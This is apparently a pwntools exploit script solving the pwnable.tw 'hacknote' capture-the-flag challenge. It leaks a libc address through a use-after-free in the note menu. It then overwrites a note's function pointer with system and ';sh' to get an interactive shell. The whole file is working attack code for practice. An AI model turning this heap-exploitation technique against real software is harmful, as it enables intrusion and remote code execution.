from pwn import *
elf = context.binary = ELF('./hacknote_patched')
libc = ELF('./libc_32.so.6')
r = elf.process()
# r = remote("chall.pwnable.tw", 10102)

def add(size, content:bytes):
    r.sendlineafter(b"Your choice :", str(1).encode())
    r.sendlineafter(b"Note size :", str(size).encode())
    r.sendlineafter(b"Content :", content)

def delete(index):
    r.sendlineafter(b"Your choice :", str(2).encode())
    r.sendlineafter(b"Index :", str(index).encode())

def show(index):
    r.sendlineafter(b"Your choice :", str(3).encode())
    r.sendlineafter(b"Index :", str(index).encode())
###############
#  LEAK libc  #
###############
add(0x70, b"a" * 0x20)
add(0x70, b"b" * 0x20)
delete(0)
add(0x70, b"ddd")
show(0)
r.recvuntil(b"ddd\n")
libc_leak = u32(r.recv(4))
libc.address = libc_leak - 1771440
log.success(f"LIBC Base: {hex(libc.address)}")

system = libc.sym["system"]
delete(1)
delete(0)
gdb.attach(r, '''
    b* 0x80487d3\n
    b* 0x80488a4\n
    b* 0x8048955\n
    c
''')
add(0x8, p32(system) + b';sh\0')
show(0)
r.interactive()